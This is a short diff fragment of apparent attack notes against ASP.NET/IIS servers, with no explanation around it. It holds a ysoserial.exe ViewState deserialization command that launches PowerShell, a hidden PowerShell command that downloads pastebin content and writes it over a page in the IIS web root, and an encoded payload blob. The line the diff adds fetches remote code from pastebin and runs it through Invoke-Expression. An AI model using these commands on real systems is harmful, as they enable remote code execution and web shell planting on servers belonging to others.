@@ -3,3 +3,5 @@ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -ExecutionPolic
 powershell -ep bypass Bypass -WindowStyle Hidden -NoProfile -Command (Invoke-WebRequest https://pastebin.com/raw/Xih9xGK8).Content | Out-File -FilePath C:\inetpub\wwwroot\default_page.aspx -Encoding utf8
 
 H4sIAAZ25WgC/w3NTQ+CIACA4Z+U4jx48JCWiRlNDVBuAg1aoK38/vV5ei/P9h7mc6LmZOaeNKJDPaPLD8bunbvRygH78AtWOUYTp67mtlDwbUZpgy+r3OSZRiur0dbSYISxznjHphbggQDywpYskpJNxseB1MgUNtkdKpo62+t3MJa9TMtZbP2Ue5EWXmkaa8bc7q8qWJtaTLeH1piwRZCmu1b+iQPfYdR3oArDP7eK3BC4AAAA
+
+Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'https://pastebin.com/raw/18aQVqqV').Content
